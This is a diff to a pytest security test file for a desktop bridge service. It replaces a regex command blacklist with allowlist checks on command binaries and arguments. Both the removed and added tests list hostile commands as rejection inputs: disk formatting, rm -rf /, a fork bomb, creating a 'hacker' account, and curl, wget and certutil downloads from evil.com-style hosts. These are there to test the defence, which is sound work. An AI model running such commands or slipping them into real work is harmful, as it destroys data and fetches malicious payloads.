@@ -1,17 +1,17 @@
 """
 Desktop Bridge Defense-in-Depth Security Tests:
-Verifies constant-time HMAC bearer authentication, path jail traversal prevention,
-command injection blacklist regexes, and payload size bounds.
+Verifies constant-time HMAC bearer authentication, parameterized command allowlisting,
+shell=False binary validation, path jail traversal prevention, and sensitive file protection.
 """
 
-import re
+import pytest
 from pathlib import Path
 import desktop_bridge
 
 
 def test_constant_time_hmac_auth(monkeypatch):
-    """Verifies that requests require a valid Bearer token matching FLEET_KEY."""
-    monkeypatch.setattr(desktop_bridge, "FLEET_KEY", "super_secret_256bit_cluster_token")
+    """Verifies that requests require a valid Bearer token matching FLEET_BRIDGE_KEY."""
+    monkeypatch.setattr(desktop_bridge, "FLEET_BRIDGE_KEY", "super_secret_256bit_bridge_token")
 
     class DummyHandler:
         def __init__(self, headers):
@@ -31,34 +31,59 @@ def test_constant_time_hmac_auth(monkeypatch):
     assert not DummyHandler({"Authorization": "Bearer super_secret"})._verify_auth()
 
     # Exact token -> True
-    assert DummyHandler({"Authorization": "Bearer super_secret_256bit_cluster_token"})._verify_auth()
+    assert DummyHandler({"Authorization": "Bearer super_secret_256bit_bridge_token"})._verify_auth()
 
 
-def test_command_blacklist_catches_destructive_commands():
-    """Verifies regex patterns prevent dangerous disk, system, and fork-bomb commands."""
-    dangerous_commands = [
-        "format c: /fs:ntfs",
-        "FORMAT D:",
-        "diskpart /s script.txt",
-        "rmdir /s /q C:\\Users",
-        "rmdir /S /Q D:\\Data",
-        "rm -rf /",
-        "rm -rf /etc",
-        "shutdown /s /t 0",
-        "stop-computer -Force",
-        "net user hacker password /add",
-        "reg delete HKLM\\Software",
-        ":(){ :|:& };:"
+def test_command_allowlist_rejects_unauthorized_binaries():
+    """Verifies that arbitrary binaries like powershell, cmd, bash, or curl are rejected."""
+    forbidden_commands = [
+        "powershell -EncodedCommand JABjAG0AZAA=",
+        "cmd.exe /c whoami",
+        "bash -c 'rm -rf /'",
+        "curl http://malicious.site/payload.sh",
+        "wget https://evil.com/dropper",
+        "certutil.exe -urlcache -f http://evil.com",
     ]
 
-    for cmd in dangerous_commands:
-        matched = False
-        cmd_lower = cmd.lower()
-        for pattern in desktop_bridge.COMMAND_BLACKLIST:
-            if re.search(pattern, cmd_lower):
-                matched = True
-                break
-        assert matched, f"Command '{cmd}' should have been blocked by COMMAND_BLACKLIST!"
+    for cmd in forbidden_commands:
+        with pytest.raises(PermissionError) as excinfo:
+            desktop_bridge.parse_and_validate_command(cmd)
+        assert "not authorized" in str(excinfo.value)
+
+
+def test_command_allowlist_accepts_authorized_binaries():
+    """Verifies that allowlisted diagnostic binaries parse into clean token arrays."""
+    valid_commands = [
+        "git status -s",
+        "git log -n 5 --oneline",
+        "nvidia-smi --query-gpu=name,temperature.gpu --format=csv",
+        "whoami",
+    ]
+
+    for cmd in valid_commands:
+        tokens = desktop_bridge.parse_and_validate_command(cmd)
+        assert isinstance(tokens, list)
+        assert len(tokens) >= 1
+
+
+def test_command_allowlist_rejects_dangerous_arguments():
+    """Verifies that even within allowed binaries, dangerous arguments are blocked."""
+    dangerous_args = [
+        "git -rf /",
+        "python -c shutdown",
+    ]
+
+    for cmd in dangerous_args:
+        with pytest.raises(PermissionError) as excinfo:
+            desktop_bridge.parse_and_validate_command(cmd)
+        assert "forbidden by security policy" in str(excinfo.value)
+
+
+def test_predeclared_actions():
+    """Verifies pre-declared actions are properly defined as structured arrays."""
+    assert "gpu_status" in desktop_bridge.ALLOWED_ACTIONS
+    assert "git_status" in desktop_bridge.ALLOWED_ACTIONS
+    assert isinstance(desktop_bridge.ALLOWED_ACTIONS["gpu_status"], list)
 
 
 def test_path_jail_blocks_traversal(tmp_path, monkeypatch):
